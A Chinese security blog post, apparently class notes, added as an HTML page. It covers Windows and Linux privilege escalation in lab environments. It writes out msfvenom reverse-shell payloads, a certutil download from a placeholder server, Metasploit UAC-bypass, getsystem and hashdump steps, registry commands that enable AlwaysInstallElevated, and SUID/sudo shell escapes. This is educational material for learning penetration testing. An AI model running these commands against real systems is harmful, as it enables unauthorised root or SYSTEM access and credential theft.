@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="generator" content="Hexo">
+<title>权限提升 - swfk 的安全笔记</title>
+<meta name="description" content="Windows 内核溢出、服务路径、AlwaysInstallElevated 与 Linux SUID、内核漏洞等提权手法。">
+<meta name="author" content="swfk2154">
+<meta name="keywords" content="AI安全, 网络安全, 大模型安全, LLM安全, 渗透测试, 安全运营">
+<meta name="theme-color" id="theme-color" content="#f8f7f4">
+<link rel="icon" type="image/svg+xml" href="/images/clay-avatar.svg">
+<link rel="apple-touch-icon" href="/icon.png">
+<link rel="canonical" href="https://blogbu2154.site/privilege-escalation/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限提升 - swfk 的安全笔记">
+<meta property="og:description" content="Windows 内核溢出、服务路径、AlwaysInstallElevated 与 Linux SUID、内核漏洞等提权手法。">
+<meta property="og:url" content="https://blogbu2154.site/privilege-escalation/">
+<meta property="og:site_name" content="swfk 的安全笔记">
+<meta property="og:image" content="/medias/featureimages/20.jpg">
+<meta name="twitter:card" content="summary">
+<link rel="alternate" type="application/atom+xml" title="swfk 的安全笔记" href="/atom.xml">
+<link rel="stylesheet" href="/css/clay.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+
+<script>
+  // 尽早恢复主题，避免首屏闪烁
+  (function () {
+    try {
+      var t = localStorage.getItem('clay-theme') ||
+        (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light');
+      document.documentElement.dataset.theme = t;
+    } catch (e) {
+      document.documentElement.dataset.theme = 'light';
+    }
+  })();
+</script>
+
+
+<body class="">
+  <a class="skip-link" href="#main">跳到正文</a>
+  <header class="site-nav">
+  <nav class="site-nav__pill" aria-label="主导航">
+    
+      
+        <a href="/" class="">首页</a>
+      
+        <a href="/archives" class="">归档</a>
+      
+        <a href="/categories" class="">分类</a>
+      
+        <a href="/tags" class="">标签</a>
+      
+        <a href="/about" class="">关于</a>
+      
+    
+    
+      <button type="button" class="site-nav__icon" data-search-open aria-label="站内搜索">
+        <svg viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      </button>
+      <a class="site-nav__icon" href="https://github.com/swfk2154" target="_blank" rel="noopener noreferrer" aria-label="GitHub">
+        <svg class="icon-github" viewBox="0 0 24 24" width="26" height="26" fill="currentColor" aria-hidden="true"><path d="M12 .5C5.65.5.5 5.65.5 12a11.5 11.5 0 0 0 7.86 10.92c.58.11.79-.25.79-.56v-2c-3.2.7-3.88-1.54-3.88-1.54-.53-1.33-1.28-1.69-1.28-1.69-1.04-.71.08-.7.08-.7 1.15.08 1.76 1.18 1.76 1.18 1.03 1.75 2.7 1.25 3.36.95.1-.74.4-1.25.72-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.26.45-2.28 1.18-3.09-.12-.29-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.74 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.76.11 3.05.74.81 1.18 1.83 1.18 3.09 0 4.41-2.69 5.38-5.26 5.66.41.36.78 1.06.78 2.14v3.17c0 .31.21.68.8.56A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5z"/></svg>
+      </a>
+    
+    <button type="button" class="site-nav__icon theme-toggle" data-theme-toggle aria-label="切换主题">
+      <svg class="theme-toggle__moon" viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg>
+      <svg class="theme-toggle__sun" viewBox="0 0 24 24" width="19" height="19" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg>
+    </button>
+  </nav>
+</header>
+
+  <main id="main">
+    
+<div class="reading-progress" aria-hidden="true"><span data-reading-progress></span></div>
+<article class="article article--toc">
+  <div class="article__body">
+    
+
+<aside class="article__aside">
+  <div class="toc-box">
+    <div class="toc-box__title">目录</div>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-%E6%8F%90%E6%9D%83%E9%99%90"><span class="toc-text">windows 提权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E4%BB%8B%E7%BB%8D"><span class="toc-text">靶场介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rottenpotato-%E6%8F%90%E6%9D%83%E9%99%90%EF%BC%88ms16-075%EF%BC%89"><span class="toc-text">rottenpotato 提权限（ms16-075）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%8E%B7%E5%8F%96webshell"><span class="toc-text">1 获取webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%B8%8A%E7%BA%BF-meterpreter"><span class="toc-text">2  上线 meterpreter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83"><span class="toc-text">3  进行提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-uac-%E6%8F%90%E6%9D%83%E9%99%90"><span class="toc-text">bypass  uac  提权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%8A%E7%BA%BF%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E7%9A%84meterpreter-%EF%BC%88%E8%AF%A5%E7%94%A8%E6%88%B7%E5%BF%85%E9%A1%BB%E5%9C%A8-administrators-%E7%94%A8%E6%88%B7%E7%BB%84%E4%B8%AD%EF%BC%89"><span class="toc-text">1  上线普通用户的meterpreter （该用户必须在 administrators 用户组中）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8bypass-uac-%E6%A8%A1%E5%9D%97%E6%8F%90%E6%9D%83"><span class="toc-text">2  使用bypass uac 模块提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-getsystem"><span class="toc-text">3  getsystem</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getsystem-%E5%92%8C-drop-token"><span class="toc-text">getsystem 和 drop_token</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-text">内核漏洞提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E6%AD%A5%E9%AA%A4"><span class="toc-text">操作步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E7%9A%84%E9%85%8D%E7%BD%AE%E6%8F%90%E6%9D%83"><span class="toc-text">错误的配置提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-text">不安全的服务权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E5%AE%89%E8%A3%85MSI"><span class="toc-text">管理员安装MSI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%EF%BC%88%E4%BA%86%E8%A7%A3%EF%BC%89"><span class="toc-text">不安全的服务路径（了解）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-%E6%8F%90%E6%9D%83"><span class="toc-text">Linux 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B2%98%E6%BB%9E%E4%BD%8D"><span class="toc-text">粘滞位</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E4%BB%8B%E7%BB%8D-1"><span class="toc-text">靶场介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83-1"><span class="toc-text">内核漏洞提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E7%9A%84%E9%85%8D%E7%BD%AE%E6%8F%90%E6%9D%83-1"><span class="toc-text">错误的配置提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#suid-%E6%8F%90%E6%9D%83"><span class="toc-text">suid 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%85%B7%E6%9C%89-suid-%E6%9D%83%E9%99%90%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-text">1  查找所有具有 suid 权限的文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%B0%E4%B8%8B%E5%88%97%E7%BD%91%E7%AB%99%E4%B8%AD%E6%90%9C%E7%B4%A2%E6%98%AF%E5%90%A6%E5%85%B7%E6%9C%89-suid-%E6%8F%90%E6%9D%83%E7%9A%84%E8%83%BD%E5%8A%9B-https-gtfobins-org"><span class="toc-text">2  到下列网站中搜索是否具有 suid 提权的能力    https:&#x2F;&#x2F;gtfobins.org&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-%E6%8F%90%E6%9D%83"><span class="toc-text">sudo 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-sudo-l-%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E8%83%BD%E5%A4%9F%E4%BD%BF%E7%94%A8sudo-%E6%89%A7%E8%A1%8C%E5%93%AA%E4%BA%9B%E5%91%BD%E4%BB%A4"><span class="toc-text">1  sudo -l 查看当前用户能够使用sudo 执行哪些命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%B0%E4%B8%8B%E5%88%97%E7%BD%91%E7%AB%99%E4%B8%AD%E6%90%9C%E7%B4%A2%E6%98%AF%E5%90%A6%E5%85%B7%E6%9C%89-sudo-%E6%8F%90%E6%9D%83%E7%9A%84%E8%83%BD%E5%8A%9B-https-gtfobins-org"><span class="toc-text">2 到下列网站中搜索是否具有 sudo 提权的能力   https:&#x2F;&#x2F;gtfobins.org&#x2F;</span></a></li></ol></li></ol></li></ol>
+  </div>
+</aside>
+
+
+    <div class="article__main">
+      <header class="article__header reveal">
+        <p class="eyebrow">网络安全</p>
+        <h1>权限提升</h1>
+        <div class="post-meta">
+          <time datetime="2026-01-28">2026-01-28</time>
+          
+            <span>更新于 2026-08-29</span>
+          
+        </div>
+      </header>
+      
+        <figure class="article__cover reveal"><img src="/medias/featureimages/20.jpg" alt="权限提升" loading="eager" onerror="this.parentElement.style.display='none'"></figure>
+      
+      <div class="post-content reveal">
+        <blockquote>
+<p>本篇整理自我的语雀学习笔记（课堂学习与实操记录），已转为纯文字版并按博客格式排版。</p>
+</blockquote>
+<span id="more"></span>
+
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h2 id="windows-提权限"><a href="#windows-提权限" class="headerlink" title="windows 提权限"></a>windows 提权限</h2><h2 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h2><p>靶场介绍： 双击 .vmx 即可打开 ，默认用户名 zhangsan ，默认密码 1qaz@WSX （桥接和 NAT均可）</p>
+<p><code>IP: 192.168.79.133</code></p>
+<h2 id="rottenpotato-提权限（ms16-075）"><a href="#rottenpotato-提权限（ms16-075）" class="headerlink" title="rottenpotato 提权限（ms16-075）"></a>rottenpotato 提权限（ms16-075）</h2><p> 作用：把windows 的服务账户（如IIS中间件的用户）提升到 system 用户</p>
+<p>操作步骤：</p>
+<h3 id="1-获取webshell"><a href="#1-获取webshell" class="headerlink" title="1 获取webshell"></a>1 获取webshell</h3><p>ASP 是 Active Server Pages 的缩写，是微软（Microsoft）开发的一种服务器端脚本技术，用于创建动态网页。它最早在 1996 年推出，主要用于在 IIS（Internet Information Services）服务器上运行</p>
+<p>IIS 服务账户，默认有SeAssignPrimaryTokenPrivilege 和 SeImpersonatePrivilege 权限，是进行 rottenpotato 提权的前提条件</p>
+<h3 id="2-上线-meterpreter"><a href="#2-上线-meterpreter" class="headerlink" title="2  上线 meterpreter"></a>2  上线 meterpreter</h3><h3 id="3-进行提权"><a href="#3-进行提权" class="headerlink" title="3  进行提权"></a>3  进行提权</h3><pre><code class="hljs plain">search ms16-075
+use 4</code></pre>
+
+<h2 id="bypass-uac-提权限"><a href="#bypass-uac-提权限" class="headerlink" title="bypass  uac  提权限"></a>bypass  uac  提权限</h2><ul>
+<li>前提：已获取的用户权限需要在 administrators 用户组中</li>
+<li>作用：处在 administrators 用户组中除 administrator 之外其他用户的提权</li>
+<li>administrators 用户组，除了 administrator 自己，其他的管理员用户（如zhangsan、lisi）均为 受限制（受到了UAC限制）的管理员</li>
+<li>UAC：用户账户控制，限制除 administrator 之外其他用户的权限</li>
+</ul>
+<p>操作：</p>
+<h3 id="1-上线普通用户的meterpreter-（该用户必须在-administrators-用户组中）"><a href="#1-上线普通用户的meterpreter-（该用户必须在-administrators-用户组中）" class="headerlink" title="1  上线普通用户的meterpreter （该用户必须在 administrators 用户组中）"></a>1  上线普通用户的meterpreter （该用户必须在 administrators 用户组中）</h3><p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.79.129 lport=7586 -f exe -o 123.exe</code></p>
+<p><code>handler -p  windows/x64/meterpreter/reverse_tcp -H 192.168.79.129 -P 7586</code></p>
+<p><code>certutil -urlcache -split -f http://云服务器IP:端口/123.exe</code></p>
+<h3 id="2-使用bypass-uac-模块提权"><a href="#2-使用bypass-uac-模块提权" class="headerlink" title="2  使用bypass uac 模块提权"></a>2  使用bypass uac 模块提权</h3><p><code>search bypassuac</code></p>
+<pre><code class="hljs plain">set session 1
+set payload windows/x64/meterpreter/reverse_tcp
+set lport 9123
+show targets
+set target 1</code></pre>
+
+<h3 id="3-getsystem"><a href="#3-getsystem" class="headerlink" title="3  getsystem"></a>3  getsystem</h3><p> bypass uac 上线新的 meterpreter ，用户名依然不变  (run)</p>
+<ul>
+<li>如果想从之前的用户名（如zhangsan）切换到 system 用户，需要执行 getsystem</li>
+<li>如果想回到之前的用户名 （如zhangsan），需要执行 drop_token</li>
+</ul>
+<pre><code class="hljs plain">getuid
+getsystem
+getuid
+hashdump
+
+getprivs</code></pre>
+
+<p> 其他bypassuac 方法参考： <a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p>
+<h2 id="getsystem-和-drop-token"><a href="#getsystem-和-drop-token" class="headerlink" title="getsystem 和 drop_token"></a>getsystem 和 drop_token</h2><p>getsystem： 如果当前用户有 SeImpersonatePrivilege 权限，可以通过命名管道模拟 system 用 户的令牌 （切换到 system 用户）</p>
+<p>如果没有 SeImpersonatePrivilege 权限， getsystem 就无法运行</p>
+<p> drop_token: 丢弃 system 用户的令牌，还原为 windows 的真实用户</p>
+<h2 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h2><p>windows 本身内核或服务出现的历史漏洞</p>
+<h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><p> <code>use post/multi/recon/local_exploit_suggester  </code></p>
+<p><code>use exploit/windows/local/ms15_051_client_copy_image</code></p>
+<h2 id="错误的配置提权"><a href="#错误的配置提权" class="headerlink" title="错误的配置提权"></a>错误的配置提权</h2><h3 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h3><p>windows 中可能存在部分服务配置错误，允许普通用户修改、重启服务，攻击者可以直接修改服 务对应可执行文件路径为木马文件路径，服务启动时，运行的就是木马</p>
+<p> windows 系统服务运行权限都是 SYSTEM 用户</p>
+<p> <code>use exploit/windows/local/service_permissions  </code></p>
+<h3 id="管理员安装MSI"><a href="#管理员安装MSI" class="headerlink" title="管理员安装MSI"></a>管理员安装MSI</h3><p>msi 是windows的安装包，有些windows 系统会启用策略 “always_install_elevated” ，意为始终以管理员权限安装msi安装包。 攻击者创建一个 msi 安装包格式的木马，受害者打开安装包，即可完成提权</p>
+<pre><code class="hljs plain">reg add HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+
+reg add HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
+reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v DisableMSI /t REG_DWORD /d 0 /f</code></pre>
+
+<p> 提权步骤：</p>
+<p> <code>use exploit/windows/local/always_install_elevated  </code></p>
+<h3 id="不安全的服务路径（了解）"><a href="#不安全的服务路径（了解）" class="headerlink" title="不安全的服务路径（了解）"></a>不安全的服务路径（了解）</h3><p>前提： windows 服务，对应的路径中有空格</p>
+<p>靶场中 存在服务 Windows FTP Server ，路径如下，有空格， 实际打开的是 FTPserver.exe 文 件</p>
+<p> <code>C:\Program Files (x86)\FTP Folder\FTP Services\FTPserver.exe </code></p>
+<pre><code class="hljs plain">对于这种带空格的路径，windows 打开 FTPserver.exe 时，发生了什么？
+
+尝试执行 C:\Program.exe 把 Files (x86)\FTP Folder\FTP Services\FTPserver.exe 作
+为参数，执行失败，继续
+
+尝试执行 C:\Program Files (x86)\FTP.exe 把 Folder\FTP Services\FTPserver.exe 作为
+参数，执行失败，继续
+
+尝试执行C:\Program Files (x86)\FTP Folder\FTP.exe ，把 Services\FTPserver.exe 作为
+参数，执行失败，继续
+
+尝试执行 C:\Program Files (x86)\FTP Folder\FTP Services\FTPserver.exe ，成功
+
+攻击者如果上传一个木马 C:\Program Files (x86)\FTP Folder\FTP.exe，就会被 windows 执行</code></pre>
+
+<p>攻击步骤 （失败率非常高，可以忽略）</p>
+<p> <code>use exploit/windows/local/unquoted_service_path  </code></p>
+<p>因为 windows 非管理员用户是默认无法重启服务的，只能重启电脑，在现实中不可能这样干， 可以直接忽略</p>
+<h2 id="Linux-提权"><a href="#Linux-提权" class="headerlink" title="Linux 提权"></a>Linux 提权</h2><h3 id="粘滞位"><a href="#粘滞位" class="headerlink" title="粘滞位"></a>粘滞位</h3><p>Linux 中，粘滞位（Sticky Bit） 是一种特殊的文件权限位，主要用于目录，其作用是：</p>
+<p>即使用户对某个目录具有写权限，也只能删除自己创建的文件，不能删除其他用户的文件</p>
+<h2 id="靶场介绍-1"><a href="#靶场介绍-1" class="headerlink" title="靶场介绍"></a>靶场介绍</h2><p> 导入靶场</p>
+<pre><code class="hljs plain">docker load -i &lt; linux_elevate.tar
+docker run -d -p 2222:22 linux_elevate_hub:latest</code></pre>
+
+<p>ssh 登录靶场，默认用户名 zhangsan 密码 123456</p>
+<h2 id="内核漏洞提权-1"><a href="#内核漏洞提权-1" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h2><p> linux 本身内核或服务出现的历史漏洞</p>
+<p> 1  uname -a 看内核版本号</p>
+<p>2  搜索对应的内核版本是否存在漏洞   ( google 搜索 )</p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a> 搜索</p>
+<p>linux历史漏洞集合： <a target="_blank" rel="noopener" href="https://github.com/SecWiki/linux-kernel-exploits">https://github.com/SecWiki/linux-kernel-exploits</a></p>
+<p>比较出名的历史漏洞： 脏牛漏洞 <a target="_blank" rel="noopener" href="https://github.com/firefart/dirtycow">https://github.com/firefart/dirtycow</a> ，任意地址、任意文件写</p>
+<h2 id="错误的配置提权-1"><a href="#错误的配置提权-1" class="headerlink" title="错误的配置提权"></a>错误的配置提权</h2><h3 id="suid-提权"><a href="#suid-提权" class="headerlink" title="suid 提权"></a>suid 提权</h3><p> suid 权限：文件运行的权限是文件属主的权限</p>
+<h4 id="1-查找所有具有-suid-权限的文件"><a href="#1-查找所有具有-suid-权限的文件" class="headerlink" title="1  查找所有具有 suid 权限的文件"></a>1  查找所有具有 suid 权限的文件</h4><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+<h4 id="2-到下列网站中搜索是否具有-suid-提权的能力-https-gtfobins-org"><a href="#2-到下列网站中搜索是否具有-suid-提权的能力-https-gtfobins-org" class="headerlink" title="2  到下列网站中搜索是否具有 suid 提权的能力    https://gtfobins.org/"></a>2  到下列网站中搜索是否具有 suid 提权的能力    <a target="_blank" rel="noopener" href="https://gtfobins.org/">https://gtfobins.org/</a></h4><p><code>find . -exec /bin/sh -p \; -quit</code></p>
+<h3 id="sudo-提权"><a href="#sudo-提权" class="headerlink" title="sudo 提权"></a>sudo 提权</h3><h4 id="1-sudo-l-查看当前用户能够使用sudo-执行哪些命令"><a href="#1-sudo-l-查看当前用户能够使用sudo-执行哪些命令" class="headerlink" title="1  sudo -l 查看当前用户能够使用sudo 执行哪些命令"></a>1  sudo -l 查看当前用户能够使用sudo 执行哪些命令</h4><pre><code class="hljs plain">sudo  -l</code></pre>
+
+<h4 id="2-到下列网站中搜索是否具有-sudo-提权的能力-https-gtfobins-org"><a href="#2-到下列网站中搜索是否具有-sudo-提权的能力-https-gtfobins-org" class="headerlink" title="2 到下列网站中搜索是否具有 sudo 提权的能力   https://gtfobins.org/"></a>2 到下列网站中搜索是否具有 sudo 提权的能力   <a target="_blank" rel="noopener" href="https://gtfobins.org/">https://gtfobins.org/</a></h4><p>3  执行 sudo + 命令即可提权</p>
+<p><code>sudo   bash</code></p>
+
+      </div>
+
+      
+      <div class="article__tags reveal">
+        <span class="article__tags-label">标签</span>
+        <div class="tag-list">
+          
+            <a href="/tags/%E6%8F%90%E6%9D%83/"><span>提权</span></a>
+          
+            <a href="/tags/Windows/"><span>Windows</span></a>
+          
+            <a href="/tags/Linux/"><span>Linux</span></a>
+          
+        </div>
+      </div>
+      
+
+      <nav class="post-nav reveal" aria-label="前后文章">
+        
+          <a class="post-nav__prev" href="/persistence-techniques/">
+            <span>← 上一篇</span>
+            <strong>权限维持</strong>
+          </a>
+        
+        
+          <a class="post-nav__next" href="/intranet-recon-windows-auth/">
+            <span>下一篇 →</span>
+            <strong>内网信息收集与 Windows 认证协议</strong>
+          </a>
+        
+      </nav>
+
+      
+      <div class="reward reveal">
+        <button type="button" class="reward__toggle" data-reward-toggle>
+          <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2v20M2 7h20v10H2z"/><path d="M12 2a7 7 0 0 1 0 10M12 12a7 7 0 0 0 0 10"/></svg>
+          打赏
+        </button>
+        <div class="reward__box" data-reward-box>
+          <p class="reward__title">你的赏识是我前进的动力</p>
+          <div class="reward__qrs">
+            
+              <figure><img src="/medias/reward/wechat.png" alt="微信赞赏码" loading="lazy"><figcaption>微信</figcaption></figure>
+            
+            
+              <figure><img src="/medias/reward/alipay.jpg" alt="支付宝收款码" loading="lazy"><figcaption>支付宝</figcaption></figure>
+            
+          </div>
+        </div>
+      </div>
+      
+
+      
+      <div class="cbox reveal" id="comments">
+        <div class="cbox__head"><span class="cbox__title">评论</span></div>
+        <div id="gitalk-container"></div>
+      </div>
+      
+    </div>
+  </div>
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="site-footer__inner">
+    <div class="site-footer__id">
+      <img class="site-footer__avatar" src="/images/clay-avatar.svg" alt="swfk2154" loading="lazy">
+      <div class="site-footer__id-text">
+        <strong>swfk 的安全笔记</strong>
+        <span>AI 安全 / 网络安全 / 工程实践</span>
+      </div>
+    </div>
+    <div class="site-footer__links">
+      
+        <a href="https://github.com/swfk2154" target="_blank" rel="noopener noreferrer">
+          <svg viewBox="0 0 24 24" width="15" height="15" fill="currentColor" aria-hidden="true"><path d="M12 .5C5.65.5.5 5.65.5 12a11.5 11.5 0 0 0 7.86 10.92c.58.11.79-.25.79-.56v-2c-3.2.7-3.88-1.54-3.88-1.54-.53-1.33-1.28-1.69-1.28-1.69-1.04-.71.08-.7.08-.7 1.15.08 1.76 1.18 1.76 1.18 1.03 1.75 2.7 1.25 3.36.95.1-.74.4-1.25.72-1.54-2.55-.29-5.24-1.28-5.24-5.68 0-1.26.45-2.28 1.18-3.09-.12-.29-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.74 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.76.11 3.05.74.81 1.18 1.83 1.18 3.09 0 4.41-2.69 5.38-5.26 5.66.41.36.78 1.06.78 2.14v3.17c0 .31.21.68.8.56A11.5 11.5 0 0 0 23.5 12C23.5 5.65 18.35.5 12 .5z"/></svg>
+          GitHub
+        </a>
+      
+      
+      
+        <a href="/atom.xml">
+          <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 11a9 9 0 0 1 9 9"/><path d="M4 4a16 16 0 0 1 16 16"/><circle cx="5" cy="19" r="1.4"/></svg>
+          RSS
+        </a>
+      
+    </div>
+  </div>
+  <div class="site-footer__bar">
+    <span>© 2026 - 2026 swfk2154</span>
+    <span>由 <a href="https://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a> 驱动 · Clay 主题</span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display:none">访客 <span id="busuanzi_value_site_uv"></span></span>
+      <span id="busuanzi_container_site_pv" style="display:none">浏览 <span id="busuanzi_value_site_pv"></span></span>
+    
+  </div>
+</footer>
+
+  
+<div class="search-overlay" id="search-overlay" hidden>
+  <div class="search-panel" role="dialog" aria-modal="true" aria-label="站内搜索">
+    <div class="search-bar">
+      <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      <input type="text" class="search-input" id="search-input" placeholder="搜索文章：标题 / 标签 / 正文…"
+             autocomplete="off" autocapitalize="off" spellcheck="false">
+      <button type="button" class="search-esc" data-search-close aria-label="关闭搜索">Esc</button>
+    </div>
+    <ul class="search-results" id="search-results"></ul>
+    <div class="search-hint">↑ ↓ 选择 · Enter 打开 · Esc 关闭</div>
+  </div>
+</div>
+
+  <button type="button" class="to-top" aria-label="回到顶部">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 19V5M6 11l6-6 6 6"/></svg>
+  </button>
+  
+
+<div class="music-player" data-music-player>
+  <button type="button" class="music-player__toggle" data-music-toggle aria-expanded="false" aria-controls="music-player-panel" aria-label="打开音乐播放器" title="音乐">
+    <span class="music-player__disc" aria-hidden="true">
+      <img class="music-player__disc-cover" data-music-cover alt="" hidden referrerpolicy="no-referrer">
+      <svg class="music-player__disc-note" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>
+    </span>
+    <span class="music-player__pulse" aria-hidden="true"><i></i><i></i><i></i></span>
+  </button>
+
+  <section class="music-player__panel" id="music-player-panel" data-music-panel aria-hidden="true">
+    <div class="music-player__panel-head">
+      <div class="music-player__head-copy">
+        <span class="music-player__eyebrow">MUSIC</span>
+        <h2>BGM</h2>
+      </div>
+      <button type="button" class="music-player__close" data-music-close aria-label="收起">&#215;</button>
+    </div>
+    
+    <div class="music-player__box">
+      
+      <div class="music-player__pane is-active" data-music-pane="0">
+        <div class="music-player__mount" data-ap-mount="0"></div>
+      </div>
+      
+      
+    </div>
+    <p class="music-player__foot">来自网易云音乐 · 点击列表选曲</p>
+  </section>
+  <script>window.__CLAY_MUSIC__ = {"apis":["https://api.injahow.cn/meting/?server=:server&type=:type&id=:id","https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id"],"sources":[{"server":"netease","type":"playlist","id":"8792942606"}],"order":"list","listMaxHeight":"320px","autoplay":false};</script>
+</div>
+
+
+  
+<script>
+  window.__giscusConfig = {"enable":true,"repo":"swfk2154/swfk2154.github.io","repoId":"R_kgDORBu9qA","category":"Announcements","categoryId":"DIC_kwDORBu9qM4DEDSm","mapping":"pathname","reactionsEnabled":true,"inputPosition":"top","theme":"light","lang":"zh-CN"};
+</script>
+
+<script src="/js/clay.js"></script>
